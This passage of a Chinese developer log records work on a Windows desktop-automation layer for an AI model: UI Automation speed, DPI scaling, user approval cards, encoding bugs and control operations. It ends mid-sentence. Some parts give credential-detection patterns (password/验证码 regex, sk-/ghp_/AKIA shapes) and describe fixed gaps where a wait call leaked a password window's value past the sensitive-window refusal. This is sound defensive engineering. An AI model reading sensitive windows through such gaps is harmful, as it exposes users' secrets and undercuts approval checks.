每次读窗口状态（snapshot、每次动作前后、序列每一步、每次等待）都要付这笔。拆开看：

| 组成 | 耗时 | 说明 |
| --- | --- | --- |
| `Get-Process -Id` 取进程名 | 14ms | 走 cmdlet 管线 |
| 两条 `-match` 判敏感词/终端 | 9ms | **每次调用都重新编译正则** |
| 焦点元素读 3 个属性 | 15ms | 逐个 `.Current` 读，每次都是跨进程调用 |
| 标题 + 类名 + 矩形 | 3ms | Win32，很快 |

### 2. 属性读取：元素已经缓存了，我又缓存了一遍

遍历是「`FindAll(Children)` 拿子节点 → 每个子节点 `GetUpdatedCache` 一次」。
但**激活 CacheRequest 之后，`FindAll` 返回的子节点本来就带缓存值**——
`GetUpdatedCache` 是白花的。同一会话内 A/B：

| 窗口 | 现状（逐节点 GetUpdatedCache） | 直接读 .Cached | 逐节点属性不一致 |
| --- | --- | --- | --- |
| Edge（PDF，66 节点） | 属性阶段 211ms | 117ms | 0 |
| WindowsTerminal（9 节点） | 51ms | 11ms | 0 |

改成「遍历期间保持激活 + 直接读 `.Cached`」，只给「类型读不出来」的个别元素留
`GetUpdatedCache` 兜底（只在少数 provider 上触发）。

### 3. Chromium 的「首次触摸」会骗人

同一个 Chrome 页面：第一次遍历 500-900ms，之后 90-130ms。**不是我们慢，是
Chromium 在第一次被 UIA 访问时才把无障碍树建起来。** 单次跑出来的数字会让人
以为要优化遍历，其实优化了个寂寞。

拆段计时（同一窗口，120 个控件，稳态）：

```
属性 0ms   模式探测 1ms   读值 0ms   子节点枚举 66-121ms
```

所以「模式探测 5 次/节点」这种看着很贵的东西，实测 120 个控件总共 1ms——
**本来打算优化的点，量完发现不用动**。

### 4. Python 侧很干净

| 指标 | 数值 |
| --- | --- |
| 120 个控件的 payload | 34.6KB（约 200 字节/控件） |
| 解析峰值 | 137KB（每控件 1171 字节） |
| 解析后常驻 | 4.2KB |
| 300 次「解析 → 渲染」后增长 | **2.75KB**（无泄漏） |
| JSON + Base64 序列化 | 13KB 约 1-3ms |

token 成本要说实话：120 个控件渲染后 6284 字符 ≈ **3142 tokens**，全量 JSON 是
8075 tokens，而一张截图是 1000-1800 tokens。**拉满的控件列表比截图还贵**——
所以它只在「需要精确操作」时才用，且默认上限 120 个可以按需调低。

## 改了什么

| 位置 | 改动 | 效果 |
| --- | --- | --- |
| `Get-WindowState` | 正则预编译成 `[regex]`；`Get-Process` 换 `Process.GetProcessById`；进程名表 2 秒 TTL 共享缓存 | 44ms → **15ms**（2.9x） |
| `Get-UiTree` | 遍历期间保持 CacheRequest 激活，直接读 `.Cached`，去掉逐节点 `GetUpdatedCache` | 属性阶段 2-5x，逐节点比对属性零差异 |
| `Get-VisibleWindows` | 复用同一张进程名表 | 21-24ms → 13ms |

固定开销这一项的收益会**乘以调用次数**：一个 12 步的序列要读 13 次状态（每步 + 收尾），
就是 570ms → 195ms；等待轮询（100ms 一轮）同理。

## 收获

> **先量化再优化。** 我以为「每节点探 5 个模式」是热点，实测 120 个控件加起来 1ms；
> 真正的热点是「每次都重新编译的正则」和「用 cmdlet 取进程名」这种看不见的固定开销。

> **固定开销要乘以调用次数看。** 单看 44ms 无所谓；但它在序列里要付 13 次、
> 在等待轮询里要付几百次。优化固定开销的收益，等于单次数值 × 重复次数。

> **基准要把「首次触摸」和「稳态」分开。** Chromium 页面首次 900ms、之后 100ms，
> 混在一起量会得出「遍历需要优化」的错误结论。测量脚本只给现象，判断要靠拆分。


---

# 第 27 部分：显示器与缩放 —— 坐标差 1.5 倍这件事

第三期只剩一个差距：没有多显示器 / DPI 信息。看着像"锦上添花"，其实是
**点偏位置最常见的成因**（Anthropic 的排障表里，"点击整体偏移一个方向"的第一条
原因就是坐标没按截图/屏幕比例换算）。

## 先踩了一遍自己的坑

第一版探测脚本（直接 `Add-Type System.Windows.Forms` 然后读 `Screen.AllScreens`）：

```
\\.\DISPLAY1 primary=True bounds={X=0,Y=0,Width=1440,Height=960}
系统 DC dpi: 96
```

第二版走真实 worker（装配里有 `SetProcessDPIAware()`）：

```
{"name":"\\\\.\\DISPLAY1","primary":true,"bounds":[0,0,2160,1440],
 "work":[0,0,2160,1368],"dpi_x":144,"dpi_y":144,"scale":1.5}
```

**同一台机器、同一时刻，一个是 1440x960 @ 96dpi，一个是 2160x1440 @ 144dpi。**
差 1.5 倍——正是这台机器的缩放比例。

原因很简单：不做 DPI 感知的进程看到的是**逻辑像素**（系统帮你放大），
做了感知的进程看到的是**物理像素**。我们所有截图和点击都在物理像素空间里，
所以探测脚本那一版如果被用来"告诉模型坐标"，模型会按 1440x960 去点 2160x1440 的屏，
**每个点都偏 33%**。

这就是这个工具存在的全部理由：不是给模型看"我有几块屏"，是让它知道
**这个世界里的 1 个单位到底是多少**。

## 做了什么

`desktop_displays`（只读）：

```
显示器 1 块 · 虚拟桌面 0,0 2160x1440
坐标一律是物理像素，和截图、desktop_action 同一套。
  #1 \\.\DISPLAY1（主屏） 0,0 2160x1440 · 工作区 0,0,2160,1368 · 缩放 150%（144 dpi）
前台窗口「Windows PowerShell」在 #1 上。
这块屏是 150% 缩放：网页/设计稿给的逻辑坐标要乘 1.5 才是这里用的物理像素。
```

实现要点：

- `EnumDisplayMonitors` + `GetMonitorInfo` 拿**物理矩形与工作区**（不是 `Screen.AllScreens`
  的逻辑矩形——那正是上面那版错的来源）；
- `GetDpiForMonitor`（shcore，Win8.1+）拿每块屏的 DPI，失败回落 96；
- 工作区独立于整屏矩形：任务栏/停靠栏占掉的部分不该被点；
- 名字按矩形匹配回 `Screen.AllScreens` 的 `DeviceName`，匹配不上就 `DISPLAY1/2`；
- 顺带把**前台窗口落在哪块屏**算出来（中心点判定），并在缩放不是 100% 时
  直接写出"逻辑坐标要乘 N"。

另外 `Get-WindowState` 多了 `dpi` 字段（`GetDpiForWindow`，一次调用），
`desktop_inspect` 在缩放不是 100% 时加一行提示——毕竟那是模型准备点坐标的地方。

## 为什么不是"让模型自己算"

可以给工具加一个 `scale` 参数让模型自己乘。但模型不知道自己看到的坐标来自逻辑空间还是
物理空间——**这个信息只有工具知道**。把它打印出来，比给一个换算函数更不容易错。

## 收获

> **"坐标系"这类全局假设要显式声明，不能靠默契。** 同一台机器上两个进程能给出
> 相差 1.5 倍的答案，而且两边都"没错"。工具的价值就是把这种默认假设摊开写出来。

> **自己写的探测脚本也会骗自己。** 第一版忘了 `SetProcessDPIAware()`，读到的是
> 逻辑像素——如果我只跑那一版就下结论，会得出"这台机器 100% 缩放、不用管"的
> 错误判断，而这正是要防的 bug。


---

# 第 28 部分：收尾——审批提示里的开发者视角

三期功能做完后盘"还有什么没收干净"，挖出三类。

## 洞 1：审批提示一直是英文 + `key=value`

`approval_view.detail()` 的输出**直接打到用户眼前**（控制台审批提示、飞书卡片、
`/approvals`、`/status`），但桌面/截图/剪贴板/删除这一族一直长这样：

```
desktop input: action=type, foreground pid=7, window id=AB, text length=3
capture the local all screen (full screen)
move 2 item(s) to the recycle bin (restorable):
```

前十二轮 UX 清理为什么没抓到：守卫扫的是「传给 `_notice`/`render`/`Static` 的字符串」，
而 `detail()` 返回的是函数里的**字面量**，一次都没进过那些调用。

改成中文后：

```
桌面操作：点击，目标进程 7，目标窗口 AB，坐标 (1,2)，左键单击
桌面操作：组合动作，目标进程 7，目标窗口 AB
依次执行 3 步：
  1. 左键单击 (1,2)
  2. 输入 3 个字符：abc
  3. 按键 enter
用 3 个字符覆盖本机剪贴板（会冲掉你现在复制的内容），开头是：abc
```

顺带：通用兜底（未登记工具 + MCP）`url=…` → `网址：…`；五个**无参数**工具补了
"会做什么"——`revoke_permissions` 原来在审批卡上是一片空白，等于盲签。

守卫改成**行为级**：35 个工具各喂一份代表性参数，断言非空 + 含中文 + 无 `key=value` + GBK 可编码。

## 洞 2：恢复分类漏了所有新工具

`tool_recovery` 决定"回合被打断后要不要重试"，未登记的一律按 `destructive`，
恢复提示会说"可能已部分生效，先检查状态"——对纯读工具是误导。顺带发现之前几轮
也漏了 `remember`/`forget`/`recall`/`remind`/`move_paths`/`undo_moves`/`task`/`checkpoint`。

## 洞 3：按编号操作时，用户不知道在批准什么

审批卡原来只写 `control #3`。加了 `expect`（控件名）：显示在审批卡上，并在执行前
和实际控件名核对——对不上就拒（`#3 是 '提交按钮'，不是 '关闭'`）。

---

# 第 29 部分：五个漏洞——最严重的是编码

## 洞 1（严重）：worker 协议下中文参数被 GBK 解码破坏

`desktop_wait` 传中文控件名直接报错：

```
传入的对象无效，应为":"或"}"。 "text": "璁颁簨鏈?, ...
```

根因：`[Console]::In.ReadLine()` 在 stdin 重定向时按**控制台输入代码页**（中文系统 GBK）
解码，而 Python 写 UTF-8。受影响的是**所有**非 ASCII 参数：输入中文、等中文控件名、
剪贴板写中文、`screen_ocr` 的中文路径。

为什么测试全绿：它们都注入 runner（走 base64 环境变量那条路径），**worker 路径从没被
中文碰过**——又是"两条执行路径只测了一条"。

修法：请求行改成 base64(UTF-8 JSON)，只含 ASCII。响应不用改（`OutputEncoding` 显式 UTF-8）。

## 洞 2：`desktop_wait` 泄漏敏感窗口内容

`inspect` 拒绝密码/支付窗口，`wait` 没这条判断：

```
窗口 '密码设置与验证码'  sensitive_target=True
inspect        拒绝
wait(control)  允许 → 泄漏 输入框 value='SECRET-VALUE-123'
```

## 洞 3：wait 的指纹和 inspect 对不上 → 死循环

轮询用 80 节点/900ms、inspect 用 120/2500，指纹是内容哈希，节点数不同哈希就不同
（83 控件窗口：`4b16b723…` vs `7e9c15ec…`）。而 wait 还让模型"用这个指纹去操作"
→ `tree_changed` → 重新 inspect → 界面又变 → 死循环。改成命中时按完整预算重走一遍。

## 洞 4：`allow_terminal` 不可达

错误文案说 "re-send with `allow_terminal=true`"，但 schema 里没这个参数、tools 层也
不转发——模型照做时参数被丢掉。而且元素动作根本没这开关，而判据是"窗口属于
powershell/cmd 进程"，**用脚本起的 GUI 程序也会命中**。

## 洞 5：病灶进程名单只对两种读法生效

`HARNESS_DESKTOP_EXCLUDE_PROCESSES` 的本意是"不要进入这个进程的树"，但只有
`inspect`/`wait` 检查，`element` 照样进去。补上，并把能力层的 `forbidden`
（第四档界面规则）从"漏传就没了"改成默认从策略层取。

---

# 第 30 部分：再挖五个——中文词边界、飞书卡片、指纹里的坐标

## 洞 6（静默失效）：`\b` 对中文无效

```python
re.compile(r'(?i)\b(password|passwd|passcode|otp|2fa|验证码)\b')
```

中文没有词边界（汉字之间都是 word 字符），所以 `otp 1234` 被拦、`验证码123456` 放行。
规则存在几个月，测试一直绿——因为测试只用了英文。

修法：英文用 `\b`、中文用裸词；补"凭据形状"（`sk-`/`ghp_`/`AKIA`/私钥块）；
**不按 `token` 这个词猜**（"加一个 token 字段"是正常输入）。守护测试用**字符相邻关系**
判断，不用正则（第一版我用正则写这个检查，踩了同一个坑）。

## 洞 7（第二次踩）：飞书审批卡给 `detail()` 传中文标签

```python
tool = tool_label(req.get('tool'))    # → "操作键鼠 (desktop_action)"
detail = detail(tool, args)           # ← 按原始名分支，全部落空
```

前十二轮的中文化在飞书卡片上整个被绕过。第一次是在 `status_report.py`，当时靠"加注释
提醒调用方"——所以第二次换个文件又犯。这次改成**入口归一**：三种形态都还原成原名。

## 洞 8：指纹里的 `bounds` 让"挪窗口"= "编号全废"

元素动作按 UIA 编号定位、坐标对它毫无意义。改成只算 `编号|类型|名字`
（`value`/`enabled` 同样排除）。实测：窗口移动 + 缩放后 bounds 变了、指纹不变。

## 洞 9 / 10 / 11 / 12

- `desktop_wait` 敏感窗口泄漏（同 29 洞 2，另一处入口）；
- 活动行对桌面工具只显示 `· 操作键鼠  0.42s` → 补 `控件 #3「提交按钮」 点击`；
- `FindAll` 一次调用不受时间预算约束（PDF 子树 26154 节点要 30 秒），回来立刻检查一次。

---

# 第 31 部分：让输出「可执行」

三次改动同一个毛病：**输出告诉模型做什么，但没给它做那件事所需的东西。**

## 改进 1：inspect 让模型用 element 模式，却不给 pid 和窗口号

```
改前：前台窗口：Qoder（Qoder）
改后：前台窗口：Qoder（Qoder，pid 23844，窗口 60D5E）
     …expected_pid 填 23844，expected_window_id 填 60D5E。
```

之前模型只能再调一次 `desktop_snapshot`（又一次审批）才凑齐参数——一次点击三次审批。

## 改进 2：`desktop_wait` 的超时不是超时

实测「等 600ms」跑了 **4395ms**（deadline 只在轮询之间检查，单次遍历能烧 900ms）：

| 预算 | 改前 | 改后 |
| --- | --- | --- |
| 600ms | 4395ms | 667ms |
| 3000ms | — | 3119ms |

两处收紧：遍历预算按剩余时间裁剪、窗口等待从"固定睡 100ms"改成"睡到 deadline"。
另加自适应退避（1s 内 120ms → 400ms → 800ms），等 30 秒时轮询从约 250 次降到约 80 次。

## 改进 3：不说「能做什么」

`operations` 一直在采却从不显示，模型只能试错撞 `operation_unsupported`。现在只显示
"不是默认点击"的：`可写入` / `可切换` / `可展开` / `只能按坐标点`（纯按钮不写，省 token）。
85 控件窗口加标记后 810 字符 ≈ 405 tokens。顺带补了 9 个未登记类型的英文名
（`Thumb`→滚动滑块、`TitleBar`→标题栏…）。

---

# 第 32 部分：补能力——状态、按控件滚动、动作回执

## 缺口 1：控件状态从来没报过

`desktop_inspect` 会列复选框，但**不说是勾着还是没勾**，模型只能截图或盲目 toggle。
现在：

```
#8  复选框 "记住我" · 未勾选 · 可切换
#9  分组 "高级选项" · 已收起
#12 列表项 "列表项 1" · 可选中
```

采集端补 `ToggleState` / `ExpandCollapseState` / `SelectionItem.IsSelected` /
`ValuePattern.IsReadOnly`，成本几乎为零——这些 pattern 对象本来就已经拿到。

## 缺口 2：只能滚窗口，不能滚那个列表

物理滚轮滚的是光标底下的窗口。补 `operation='scroll'`（`ScrollPattern.LargeIncrement`）。

## 缺口 3：动作之后不知道界面变没变

点一下/展开一下，下一句最常问"现在有什么"，之前只能再 inspect（一次往返 + 一次审批）。
现在回执直接带：

```
已完成展开「高级选项」。
现在是已展开。
界面变化：多出 1 个控件。
#11 文本 "这里是展开后才有的内容" · 只能按坐标点 (139,245,593,23)
结构指纹：fe402dc9…
```

端到端跑「勾选 → 选中列表项 → 展开」：**一次 inspect + 三个动作**全部串起来，
每步的指纹都是上一步回执给的。

## 踩到的两个坑（真机输出看出来的，pytest 抓不到）

1. 把 `select` 探针合并进状态块时漏了 `$patterns.Add('select')`，列表项立刻从
   「可选中」变成「只能按坐标点」——等于不能选。
2. 旧的 toggle 探针块没删，`operations` 里出现 `('toggle','toggle')`。

两次都说明：**PowerShell 那半边没有单测，唯一验证是真机跑一遍看输出**。

---

# 第 33 部分：能力补完之后，在自己新写的代码里又抓出四个

## bug 1：`scroll` 用了不存在的变量，永远只滚一步

```powershell
function Invoke-ElementOperation($el, $node, $operation, $text, $amount) { ...
    $steps = [int]$step          # ← 应该是 $amount
```

PowerShell 读未定义变量得 `$null`，`[int]$null` 是 0，随后 `if ($steps -eq 0) { $steps = 1 }`
把它兜成 1 ——**不管传几都只滚一步**。真机测不出来（滚一格看着正常），是数字数才发现的。
改完实测 `amount=1` 挪 8 项、`amount=3` 挪 24 项。

## bug 2：`ScrollPattern` 没登记进 CacheRequest，「可滚动」永远不显示

探针用 `Get-CachedPattern`，缓存请求里只登记了 Invoke/Value/Toggle/SelectionItem/
ExpandCollapse——漏了 Scroll。于是清单里永远不出现「可滚动」，而动作侧用 live 探测又能滚：
**能用但看不见**。补进缓存请求后立刻显示，并且滚动真的生效（首项「列表项 1」→「列表项 25」）。

加了对应关系检查（两个集合必须一致）：

```
CacheRequest 声明: ['ExpandCollapse','Invoke','Scroll','SelectionItem','Toggle','Value']
探针用到        : 同上
```

顺带做了滚动目标解析：目标自己不能滚 → 找可滚祖先（列表项 → 列表）→ 再找内部
可滚后代（XAML 的 ListBox 把 ScrollViewer 藏在里面）。回执说清滚的是哪个容器。

## bug 3：常驻进程的状态串到了下一个请求

`$script:OperationNote` 是脚本级变量，worker 常驻——一次滚动的
「滚动的是外层容器『选项列表』」会挂到后面某次点击的回执上。每个请求开头清零。
实测：滚动回执有 note，紧接着的 toggle 回执 note 为空。

## bug 4：新增/消失的控件按集合算，同名控件被折叠

`@{}` 当集合用，`label|name` 相同的两个控件只算一个（「确定」「更多」这种重名很常见）。
改成计数：先算每个键"多出来几个"，再按遍历顺序取前几个。

## 顺带两处措辞

- 状态变了就别再说「界面没有变化」，两句话互相打架；
- 读不到界面时不能编一句「界面没有变化」，要说"需要 desktop_inspect 确认"。

## 一个自己造成的插曲：把这份日志写空了

写这一节时用 `open(path, 'w')` 建了第二个文件句柄，把刚写完的内容截成 0 字节——
第 28–33 部分全丢，从 HEAD 恢复后按记忆重写。

根因是**同一个文件被两个 `open()` 操作**：先 `open(p,'w').write(...)`，再
`t = open(p,'w')`（截断），最后 `t = open(p).read()`。教训：

> 改文件只用一个句柄：读一次、改内存、写一次。追加就 `open(p,'a')`，
> 不要"先写再读回"——中间那个 `'w'` 会把刚写的东西清掉。

## 收获

> **PowerShell 的拼写错误是静默的。** `$step` 不存在不会报错，只让一个数字恒为 0，
> 然后被兜底逻辑盖住。这类 bug 只能靠"看行为对不对"，不能靠"看代码有没有错"。

> **"能用"和"看得见"要同时检查。** 缓存探测和 live 探测是两条路径，只测一条就会得到
> "功能存在但清单里没有"这种半吊子状态。

> **常驻进程里的 `$script:` 变量要当全局状态对待**，每个请求开头清零。

---

# 第 34 部分：两处"验证型"能力

补完状态/滚动/回执之后，又问了一遍"模型拿到这些够不够判断成功"，补了两处：

## 写入之后要读回实际值

`setvalue` 写进去的值可能被界面格式化、截断或校验改写（写 `2026/10/28`、界面变成
`2026-10-28`；写超长文本被截断）。回执现在直接给读回值：

```
已完成写入「日期」。
读回内容 "2026-10-28"。
结构指纹：…
```

## 滚到边界要说出来

一直往下滚，滚到底之后每次调用都返回成功——模型会继续滚，每滚一次就是一轮往返加一次
审批。现在比较 `VerticalScrollPercent` 的前后值：

```
滚 20 步 → 到「列表项 40」
再滚 5 步 → note = "已经滚到底了"
反向滚 20 → 回到「列表项 1」
对复选框滚 → operation_unsupported（会提示改滚窗口）
```

## 顺手补的

- 回执里带 `operation`，工具层才能针对 `setvalue` 做读回（之前只有 `action=element`）。
- `scroll` 目标解析：自己不能滚 → 找可滚祖先 → 找内部可滚后代，都没有才报不支持。

## 收获

> **"成功"要能验证。** 动作返回成功只说明调用没报错；读回值、滚动位置这些"下游状态"
> 才是模型判断"这一步到底成没成"的依据。

> **边界情况要主动说。** 到了尽头还一直成功，等于鼓励模型空转。一句"已经滚到底了"
> 省掉的是一串无意义的审批。

---

# 第 35 部分：PowerShell 哈希表字面量的值不能跨行

这一轮又在自己新写的代码里发现三处，其中一处是个**语法坑**，值得单独记。

## 坑：`[ordered]@{ k = ('a'` 换行 `+ 'b') }` 直接语法错误

为了把错误消息写清楚，我这样写：

```powershell
return [ordered]@{ code = 'operation_unsupported';
    message = ('that control is not clickable; '
               + (Get-OperationHint $node)) }
```

PowerShell 5.1 报：

```
表达式或语句中包含意外的标记 ")"/"}"
哈希表文本中的键缺少 "="
```

最小重现确认：**哈希表字面量的「值」部分必须是单行表达式**，跨行拼接会被解析器截断。
三种写法里只有单行的能过：

| 写法 | 结果 |
| --- | --- |
| `@{ k = 'c'; message = ('A' + 'B') }` 单行 | OK |
| 值在下一行继续 `+ 'B'` | 语法错误 |
| 键值都在一行但值跨行 | 语法错误 |

修法：先拼进变量，再单行赋值。

```powershell
$why = 'that control is not clickable; ' + (Get-OperationHint $node)
return [ordered]@{ code = 'operation_unsupported'; message = $why }
```

顺带一个好消息：`ParseFile` 一次报了三个错误，但只指出第一处；改完全部跨行拼接才过。
所以**改完 PS 必须重新 ParseFile 一遍**，不能假设"改一处就够了"。

## 漏洞 1：`invalid_operation` 的提示没列 `scroll`

加了 `operation='scroll'` 之后，兜底提示还是：

```
operation must be invoke, setvalue, toggle, select, expand, collapse, or focus
```

模型看到"必须支持这些"却不知道 `scroll` 也支持。加了条断言：提示里必须列出**每一个**
合法操作——这比"记得改文案"可靠。

## 漏洞 2：控件已经消失却报成「不支持该操作」

`GetCurrentPattern` 在元素失效时抛异常，被 `Get-LivePattern` 的 catch 吞掉返回 `$null`，
于是报 `operation_unsupported: that control does not accept a value`——**方向完全错了**，
模型会去试别的操作，而正确做法是重新 inspect。

修法：动作前先探一次存活性（`$el.Current.ControlType`），失效直接报
`element_gone: that control no longer exists (the window changed); run desktop_inspect again`。

## 漏洞 3：说「不支持」却不说「支持什么」

`operation_unsupported` 原来只有一句否定。补 `Get-OperationHint`：

```
that control does not accept a value; it supports: toggle
that control does not accept a value; it exposes no automation operations; click it by coordinates
```

模型据此要么换个操作，要么退回坐标点击——都是一步。

## 顺带：`focus` 不再重复遍历

`focus` 只改键盘焦点，控件集合不会变，而动作前已经走过一棵树。复用那次结果：

```
focus 端到端：1368ms → 198ms（Chrome 页面，93 个控件）
```

动作后回执里的指纹与动作前一致（实测），这也证明复用是对的。

## 收获

> **PS 5.1 的哈希表字面量是"单行值"语法。** 跨行拼接在 C#/JS/Python 里都行，
> 在这里直接解析失败；而且一次只报一个错，容易以为改完就好了。

> **"不支持"要带上"支持什么"。** 一句否定让模型只能试错，一句"它支持 toggle"
> 让它一步到位。错误消息的成本是每次失败一轮往返加一次审批。

> **失效与不支持要分开。** 前者要求重新看一眼，后者要求换个操作——合成一句话，
> 模型就永远做不对。

---

# 第 36 部分：动作弹出对话框时，回执是自相矛盾的

这轮盯的是"真实工作流能不能一口气做完"。找到一个大问题：**点一下按钮弹出对话框**——
最常见的一种交互，回执却是矛盾的。

## 现象

点「打开对话框」之后：

```
已完成点击「打开对话框」。
界面变化：多出 5 个控件。
#2 窗口 "确认" · 只能按坐标点 (983,612,217,234)
#3 按钮 "确定" · 当前焦点 (1034,775,125,40)
结构指纹：bc676421…
要继续操作，用上面的编号配这个指纹。
```

看起来挺好。但拿这份回执去点「确定」：

```
tree_changed: the window changed since that inspection
```

因为回执里三样东西分别来自**不同时刻**：

| 内容 | 来源 | 时刻 |
| --- | --- | --- |
| pid / 窗口号 | `Get-WindowState`（动作后 40ms） | 对话框已经弹出来了 → 新窗口 |
| 控件清单 + 指纹 | `Get-UiTree $旧hwnd` | 走的是**动作前**的窗口 |
| "用上面的编号" | 工具层 | 假设两者是同一个窗口 |

于是模型拿到"新 pid + 新窗口号 + 旧树的指纹"，怎么调都撞 `tree_changed`。
而这恰恰是"点按钮 → 弹窗 → 点确定"这种最常见的两步操作。

## 三处修正

1. **先读状态、再决定走哪棵树**。原来顺序是「走树 → 读状态」，对话框如果在两者之间
   弹出来，就会得到"状态=旧窗口、控件=新对话框"。现在先 `Get-WindowState`，前台换了
   就按**新窗口**重新遍历（`$walkTarget`）。
2. **回执明说前台换了**：

   ```
   已完成点击「打开对话框」。
   前台窗口换成了「确认」（pid 35400，窗口 C0B22）。下面的编号属于新窗口，
   后续操作要用这个 pid 和窗口号。
   界面变化：多出 5 个控件。
   ```

3. **`element_action` 之前根本没解析 `state_before`**（PS 一直在回，Python 没读），
   所以"前台换没换"根本无从判断。补上。

修完实测闭环：

```
点「打开对话框」 → 回执给新 pid/窗口号 + 新窗口的 5 个控件
拿回执点「确定」 → 成功，前台回到「Harness 弹窗测试」
```

## 顺便记一条 PS 语法坑

`[ordered]@{ k = ('a'` 换行 `+ 'b') }` 在 PowerShell 5.1 里**直接语法错误**——
哈希表字面量的值必须单行。而且 `ParseFile` 一次只报第一个错，改完必须重跑一遍。

## 收获

> **回执里的每个字段必须来自同一个时刻。** "状态在 T1、控件在 T2"这种组合，
> 单看每项都对，合起来永远不能用。这类 bug 不会报错，只会让下一步莫名失败。

> **最常见的工作流要端到端跑一遍。** 「点按钮 → 弹窗 → 点确定」是桌面自动化的
> Hello World，恰恰是它坏了。单测再多也发现不了——必须是"照着回执做下一步"。

> **PS 一直在回、Python 没读**，是我这轮第二次遇到（上次是 `note`）。
> 加字段时要顺手确认两侧都改了。

---

# 第 37 部分：下拉框选不中，根因是"同一控件被走两遍"

这轮验真实工作流：下拉框选择、右键菜单。

## ComboBox：展开能行，选不中

展开之后控件列表里出现两套一模一样的项：

```
#3 列表项 "北京" · 只能按坐标点 (127,193,327,28)
#5 列表项 "上海" · 只能按坐标点 (127,221,327,29)
...
#16 列表项 "北京" · 可选中 (127,193,327,28)
```

坐标完全相同，只有后面那份标着「可选中」。模型大概率挑第一个（没操作的那份），
于是要么退回坐标点击，要么报不支持。

**根因有两层**：

1. **同一控件被走两遍**：ComboBox 展开后，弹出窗口的子树里有一份，ComboBox 自己的
   items 里还有一份。按「类型|名字|坐标」去重合并（并操作、并状态、并焦点）就只剩一条。
2. **合并了能力，元素却没换**：合并后 `operations` 里有了 `select`，但执行时用的还是
   原来那个没有 pattern 的元素 → 报出「不能选中；它支持：select」这种自相矛盾的话。
   所以合并时要把 `$elements[$slot]` 也换成能力更全的那个。

## 换过之后仍然选不中：WPF 的弹出项根本没有 SelectionItemPattern

去重干净了、元素也换了，还是失败。直接查真实能力：

```
列表项 '上海' 真实支持的模式: SynchronizedInputPattern
```

WPF 的 ComboBoxItem 在弹出层里**只支持同步输入**，没有任何选择模式。也就是说
"元素级选中"在这类控件上不存在——而用户的做法就是**点它一下**。

所以补了一条等价回退：`invoke`/`select`/`toggle`/`expand` 在元素级不支持、
但有坐标时，按坐标点中心执行一次点击，并在回执里说清楚：

```
界面变化：少了 7 个。
这个控件不支持元素级操作，已改为点击它的中心。
```

实测：展开 → 3 个列表项 → 选「上海」→ 弹出层关闭（说明选中生效）→ 回执如上。

同类还有"元素被重建"：ComboBox 每次展开都会重建弹出项，遍历时拿到的引用在动作时
已经失效（缓存里有 pattern、live 里没有）。这时按「类型|名字|坐标」重新定位一次
再试，回执注明「控件被界面重建过，已重新定位后执行」。

## 右键菜单：能用，但焦点显示泄漏了内部枚举

右键点文本 → 菜单项「复制/粘贴/删除」都出现在同一窗口的树里，前台窗口没变。
但结果文案里出现：

```
焦点「ControlType.Menu」
```

`_state_text` 在焦点控件没有名字时直接回退到程序化枚举名。加了一张中文对照表
（菜单/输入框/下拉框/列表项…），翻不出来就写「未知控件」。

## 收获

> **"同一控件被走两遍"会让能力和执行分家。** 列表里显示有 `select`、执行时说没有——
> 因为列表用了合并后的能力，执行用了没合并的元素。合并要连元素一起换。

> **元素级做不到的事，用户是怎么做的？** WPF 弹出项没有 SelectionItemPattern，但
> "点它"就是用户动作。等价回退 + 说明，比报错有用得多。

> **兜底文案最容易泄漏内部枚举。** `focused_name or focused_control_type or '未知控件'`
> 看着很稳，实际把 `ControlType.Menu` 打给了用户。

---

# 第 38 部分：文件对话框里，「打开」按钮挤不进名单

这轮验原生文件对话框（`Microsoft.Win32.OpenFileDialog`）——"打开/保存文件"是
桌面自动化第二常见的工作流。

## 好消息：对话框完全可读

```
#49 下拉框 "文件名(N):" · 已收起 · 可写入
#50 输入框 "文件名(N):" · 当前焦点 · 可写入
#52 按钮 "打开(O)"
#53 按钮 "取消"
```

树、列表、表头排序状态（`分裂按钮 "名称" · 已收起`）、只读单元格都分得清。
完整流程实测跑通：

```
点「选择文件」→ 对话框弹出（前台换窗口，回执已会说）
写路径到「文件名(N):」→ 点「打开(O)」→ 对话框关闭，前台回到主窗口
```

## 坏消息：一张表格能吃掉整个预算

对话框一共 66 个控件，其中 **42 个是文件列表的单元格**——每行被拆成
「名称 / 修改日期 / 类型」三个 `输入框`：

```
#17 输入框 "名称" · 内容 "Arduino" · 可写入
#18 输入框 "修改日期" · 内容 "2026/4/17 19:26" · 只读
#19 输入框 "类型" · 内容 "文件夹" · 只读
#21 输入框 "名称" · 内容 "BaiduNetdiskTmp" · 可写入
...
```

14 行就占掉 42 个名额。而默认上限是 120 个节点——**文件夹里有 40 个文件时，
表格会把名额吃光，「文件名」和「打开」根本不会出现在列表里**，而那恰恰是
唯一要点的两个控件。

修法：**单个父节点最多贡献 14 个子项**（`TREE_CHILDREN_PER_PARENT`），超出的
标 `truncated`。这样任何一张表格都挤不掉别处的控件，而列表本身仍然能用
`operation='scroll'` 翻（上一轮刚做的能力），组成"看到 14 个 + 往下滚"。

## 收获

> **预算要按"来源"限流，不能只设总量。** 只设总量时，一个病态容器会把预算吃光，
> 而真正重要的控件排在它后面——总量看起来够用，实际永远看不到需要的那个。

> **两个能力拼起来才是完整的。** 子项上限 + 按控件滚动：看到前 14 个、滚一下看
> 后面。缺任何一个，长列表就没法操作。

---

# 第 39 部分：「界面没有变化」是唯一需要复核的答案

这轮验右键菜单的完整流程：右键 → 菜单弹出 → 点「复制」。

## 菜单流程本身是通的

```
菜单项: [(4,'复制',('invoke',)), (5,'粘贴',('invoke',)), (6,'删除',('invoke',)), (9,'系统',('expand',))]
```

菜单项都带 `invoke`，点「复制」后回执会报"少了 5 个控件"。

## 但偶尔会报「界面没有变化」，而实际已经变了

同样三步重复跑，有一次回执说：

```
界面没有变化。
结构指纹：a93d5cb8…
要继续操作，用上面的编号配这个指纹。
```

复查一下：菜单项数量 弹出后 4 → 回执里 4（没变）→ **1 秒后实际 0**（已经关了）。
也就是遍历走早了 40ms——弹出层关闭有一点延迟。

这个错误方向特别糟：**模型读到"没有变化"会以为动作没生效，然后重试**，
而重试在一个已经关闭的菜单上必然失败，于是开始怀疑工具。

修法只针对这一种情况：**只有在此刻确实看不出变化时**，多等 140ms 再走一遍，
用第二次的结果。指纹不同说明确实变了；还是相同就如实说没变。

```
if (指纹相同) { sleep 140ms; 重走一遍; 若变了就用新的 }
```

常见的"确实有变化"路径完全不多付时间。

修完连跑三轮：

```
第 1 轮：回执说变化=True | 少了 5 个
第 2 轮：回执说变化=True | 少了 5 个
第 3 轮：回执说变化=True | 少了 5 个
```

## 收获

> **"没变"比"变了"更需要证据。** "变了"错报最多让模型多看一次；"没变"错报会让
